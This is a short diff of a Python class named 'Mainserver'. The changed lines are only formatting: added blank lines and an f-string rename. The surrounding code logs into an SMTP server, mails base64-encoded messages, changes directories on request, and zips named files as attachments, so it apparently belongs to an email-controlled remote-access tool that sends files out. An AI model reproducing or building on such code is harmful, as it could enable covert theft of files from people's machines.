@@ -46,6 +46,7 @@ class Mainserver:
                                     server.login(username, password)
                                     server.sendmail(username, getting, base64_message)
                                     server.quit()
+
                                 def changedir(path):
                                     try:
                                         os.chdir(path)
@@ -80,11 +81,12 @@ class Mainserver:
                                         msg2=clock+"\n\n"+e
                                         sendcm(msg2)
                                         print(e)
+
                                 def attachement():
                                     filename=j
                                     a = filename[1].strip()
                                     new = a.split(".")
-                                    rename=str(new[0])+".zip"
+                                    rename = f"{str(new[0])}.zip"
                                     zip_file=zipfile.ZipFile(rename, 'w')
                                     zip_file.write(filename, compress_type=zip_file.compression)
                                     zip_file.close()
